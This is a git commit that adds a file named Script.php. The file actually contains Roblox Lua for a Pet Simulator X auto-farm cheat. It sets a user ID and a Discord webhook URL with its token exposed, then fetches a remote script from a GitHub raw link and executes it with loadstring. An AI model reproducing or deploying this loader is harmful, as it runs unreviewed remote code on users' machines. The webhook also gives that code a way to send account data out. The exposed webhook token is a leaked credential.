e882dab8dd943157d453a9e5b3ef56de2b32f388
Duperd <107924399+Duperd@users.noreply.github.com>
2022-06-21 13:28:38 +0300

    Create Script.php

---
+++ Script.php
@@ -0,0 +1,3 @@
+_G.UserID = 3432594732
+_G.WebHook = "https://discord.com/api/webhooks/988727873466687508/amb0j6I9fu-PtLgtxdtN45ce7YdfRJv0sn4LgjMun_fgAcFbZ2UbJ5XL57hSBzbd-yQ_" 
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua%27),true))()
